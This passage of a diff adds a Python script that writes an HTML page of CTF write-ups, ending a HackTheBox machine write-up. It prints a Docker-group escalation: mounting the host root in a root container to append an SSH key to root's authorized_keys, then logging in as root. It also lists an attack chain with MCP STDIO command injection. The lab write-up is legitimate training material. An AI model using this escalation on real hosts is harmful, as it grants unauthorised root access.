+                                <div class="code-line"><span class="line-number">1</span><span class="line-content">newgrp docker << <span class="syntax-string">'EOF'</span></span></div>
+                                <div class="code-line"><span class="line-number">2</span><span class="line-content">docker run --rm --user root --entrypoint sh \\</span></div>
+                                <div class="code-line"><span class="line-number">3</span><span class="line-content">  -v /:/hostroot \\</span></div>
+                                <div class="code-line"><span class="line-number">4</span><span class="line-content">  privatebin/nginx-fpm-alpine:2.0.2 \\</span></div>
+                                <div class="code-line"><span class="line-number">5</span><span class="line-content">  -c <span class="syntax-string">"echo 'SSH_PUBLIC_KEY' >> /hostroot/root/.ssh/authorized_keys"</span></span></div>
+                                <div class="code-line"><span class="line-number">6</span><span class="line-content">EOF</span></div>
+                                <div class="code-line"><span class="line-number">7</span><span class="line-content"></span></div>
+                                <div class="code-line"><span class="line-number">8</span><span class="line-content">ssh -i /tmp/htb_key root@10.129.19.151</span></div>
+                            </div>
+                        </div>
+                        
+                        <p style="background: rgba(255, 123, 114, 0.1); border-left: 3px solid #ff7b72; padding: 1rem; border-radius: 0 4px 4px 0; margin: 1rem 0;">
+                            <strong style="color: #ff7b72;">Why this works:</strong> Docker containers run as root at the kernel level. Mounting <code style="background: var(--bg-dark); padding: 0.2rem 0.4rem; border-radius: 3px;">/</code> into the container gives full host filesystem access. <strong>docker group = root.</strong>
+                        </p>
+                        
+                        <p style="margin: 1rem 0;">
+                            Root flag captured ✅
+                        </p>
+                        
+                        <!-- 05. Attack Chain Summary -->
+                        <div class="section-header">
+                            <span class="section-number">// 05.</span> ATTACK CHAIN SUMMARY
+                        </div>
+                        
+                        <div class="attack-chain">
+                            <span class="chain-step">NMAP</span>
+                            <span class="chain-arrow">→</span>
+                            <span class="chain-step">SUBDOMAIN FFUF</span>
+                            <span class="chain-arrow">→</span>
+                            <span class="chain-step">MCPJam STDIO RCE</span>
+                            <span class="chain-arrow">→</span>
+                            <span class="chain-step">shell:ben</span>
+                            <span class="chain-arrow">→</span>
+                            <span class="chain-step">operator group</span>
+                            <span class="chain-arrow">→</span>
+                            <span class="chain-step">newgrp docker</span>
+                            <span class="chain-arrow">→</span>
+                            <span class="chain-step">container mount</span>
+                            <span class="chain-arrow">→</span>
+                            <span class="chain-step">root</span>
+                        </div>
+                        
+                        <!-- 06. Key Lessons -->
+                        <div class="section-header">
+                            <span class="section-number">// 06.</span> KEY LESSONS
+                        </div>
+                        
+                        <div class="lessons-grid">
+                            <div class="lesson-card">
+                                <div class="lesson-icon">🔍</div>
+                                <div class="lesson-title">Always scan all ports</div>
+                                <div class="lesson-text"><code style="background: var(--bg-dark); padding: 0.1rem 0.3rem; border-radius: 3px;">-p-</code> found port 3552. Top-1000 missed the entire attack surface.</div>
+                            </div>
+                            <div class="lesson-card">
+                                <div class="lesson-icon">🌐</div>
+                                <div class="lesson-title">Wildcard certs = subdomains</div>
+                                <div class="lesson-text"><code style="background: var(--bg-dark); padding: 0.1rem 0.3rem; border-radius: 3px;">*.kobold.htb</code> was the first hint to fuzz vhosts.</div>
+                            </div>
+                            <div class="lesson-card">
+                                <div class="lesson-icon">📖</div>
+                                <div class="lesson-title">Read API docs</div>
+                                <div class="lesson-text"><code style="background: var(--bg-dark); padding: 0.1rem 0.3rem; border-radius: 3px;">/api/openapi.json</code> revealed every endpoint and schema.</div>
+                            </div>
+                            <div class="lesson-card">
+                                <div class="lesson-icon">🤖</div>
+                                <div class="lesson-title">MCP STDIO = RCE</div>
+                                <div class="lesson-text">New protocol, same old unsanitized command execution.</div>
+                            </div>
+                            <div class="lesson-card">
+                                <div class="lesson-icon">🐳</div>
+                                <div class="lesson-title">docker group = root</div>
+                                <div class="lesson-text">Always check <code style="background: var(--bg-dark); padding: 0.1rem 0.3rem; border-radius: 3px;">/run/docker.sock</code> and group membership.</div>
+                            </div>
+                            <div class="lesson-card">
+                                <div class="lesson-icon">🔑</div>
+                                <div class="lesson-title">newgrp escalation</div>
+                                <div class="lesson-text">SUID binary for group switching, often overlooked.</div>
+                            </div>
+                        </div>
+                        
+                        <div style="margin-top: 2rem; text-align: center;">
+                            <a href="https://labs.hackthebox.com/achievement/machine/2331031/856" target="_blank" class="reveal-btn interactive" style="display: inline-block; text-decoration: none; font-size: 0.875rem;">
+                                View HTB Achievement →
+                            </a>
+                        </div>
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Placeholder Card 1 -->
+            <div class="writeup-card locked reveal">
+                <div class="writeup-header">
+                    <div class="writeup-info">
+                        <span class="writeup-name" style="text-decoration: line-through; opacity: 0.5;">[REDACTED]</span>
+                        <span class="writeup-meta">............</span>
+                        <span class="difficulty-badge difficulty-medium">Medium</span>
+                        <span class="writeup-meta">| Linux | HackTheBox</span>
+                        <span class="writeup-meta">.........</span>
+                    </div>
+                    <span class="writeup-action">[COMING SOON 🔒]</span>
+                </div>
+            </div>
+            
+            <!-- Placeholder Card 2 -->
+            <div class="writeup-card locked reveal">
+                <div class="writeup-header">
+                    <div class="writeup-info">
+                        <span class="writeup-name" style="text-decoration: line-through; opacity: 0.5;">[REDACTED]</span>
+                        <span class="writeup-meta">............</span>
+                        <span class="difficulty-badge difficulty-easy">Easy</span>
+                        <span class="writeup-meta">| Windows | HackTheBox</span>
+                        <span class="writeup-meta">.........</span>
+                    </div>
+                    <span class="writeup-action">[COMING SOON 🔒]</span>
+                </div>
+            </div>
+            
+        </section>
+        
+        <!-- Footer -->
+        <footer class="footer">
+            <p>Abdelkrim Zouaki · CTF Writeups · <a href="index.html" class="interactive">Back to Portfolio</a></p>
+        </footer>
+    </main>
+    
+    <script>
+        // Custom Cursor
+        const cursorDot = document.querySelector('.cursor-dot');
+        const cursorCircle = document.querySelector('.cursor-circle');
+        const interactiveElements = document.querySelectorAll('.interactive');
+        
+        let mouseX = 0, mouseY = 0;
+        let circleX = 0, circleY = 0;
+        
+        document.addEventListener('mousemove', (e) => {
+            mouseX = e.clientX;
+            mouseY = e.clientY;
+            
+            cursorDot.style.left = mouseX + 'px';
+            cursorDot.style.top = mouseY + 'px';
+        });
+        
+        function animateCircle() {
+            circleX += (mouseX - circleX) * 0.15;
+            circleY += (mouseY - circleY) * 0.15;
+            
+            cursorCircle.style.left = circleX + 'px';
+            cursorCircle.style.top = circleY + 'px';
+            
+            requestAnimationFrame(animateCircle);
+        }
+        animateCircle();
+        
+        interactiveElements.forEach(el => {
+            el.addEventListener('mouseenter', () => {
+                document.body.classList.add('cursor-hover');
+            });
+            el.addEventListener('mouseleave', () => {
+                document.body.classList.remove('cursor-hover');
+            });
+        });
+        
+        // Scroll Progress Bar
+        const progressBar = document.getElementById('progressBar');
+        window.addEventListener('scroll', () => {
+            const scrollTop = window.scrollY;
+            const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+            const scrollPercent = (scrollTop / docHeight) * 100;
+            progressBar.style.width = scrollPercent + '%';
+        });
+        
+        // Hex Stream Background
+        const heroBg = document.getElementById('heroBg');
+        const hexChars = '0123456789ABCDEF';
+        
+        for (let i = 0; i < 5; i++) {
+            const stream = document.createElement('div');
+            stream.className = 'hex-stream';
+            stream.style.top = (i * 20) + '%';
+            stream.style.animationDelay = (i * 2) + 's';
+            
+            let content = '';
+            for (let j = 0; j < 200; j++) {
+                content += hexChars[Math.floor(Math.random() * 16)];
+                if (j % 2 === 1) content += ' ';
+            }
+            stream.textContent = content;
+            heroBg.appendChild(stream);
+        }
+        
+        // Writeup Toggle
+        function toggleWriteup(id) {
+            const card = document.getElementById(id + 'Card');
+            const action = document.getElementById(id + 'Action');
+            
+            if (card.classList.contains('expanded')) {
+                card.classList.remove('expanded');
+                action.textContent = '[CLICK TO EXPAND ▼]';
+            } else {
+                card.classList.add('expanded');
+                action.textContent = '[CLICK TO COLLAPSE ▲]';
+            }
+        }
+        
+        // Flag Reveal
+        function toggleFlag(id) {
+            const flag = document.getElementById(id);
+            flag.classList.toggle('revealed');
+        }
+        
+        // Reveal on Scroll
+        const revealElements = document.querySelectorAll('.reveal');
+        
+        const revealObserver = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.classList.add('active');
+                }
+            });
+        }, {
+            threshold: 0.1,
+            rootMargin: '0px 0px -50px 0px'
+        });
+        
+        revealElements.forEach(el => revealObserver.observe(el));
+    </script>
+</body>
+</html>'''
+
+# Save the file
+with open('/mnt/kimi/output/ctf.html', 'w', encoding='utf-8') as f:
+    f.write(html_content)
+
+print("File saved successfully to /mnt/kimi/output/ctf.html")
+print(f"File size: {len(html_content)} characters")
